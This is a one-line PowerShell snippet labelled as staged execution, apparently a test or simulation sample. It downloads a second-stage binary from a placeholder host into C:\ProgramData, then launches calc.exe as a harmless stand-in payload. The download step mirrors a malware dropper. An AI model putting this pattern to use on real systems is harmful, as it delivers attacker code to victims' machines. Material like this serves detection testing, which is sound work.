
<# Staged execution #> $DownloadUrl = 'http://example.net:80/stage2.bin'; $WorkingPath = "C:\ProgramData\stage2.bin"; (New-Object System.Net.WebClient).DownloadFile($DownloadUrl, $WorkingPath); & "calc.exe"; $StageMarker = "stage-24"
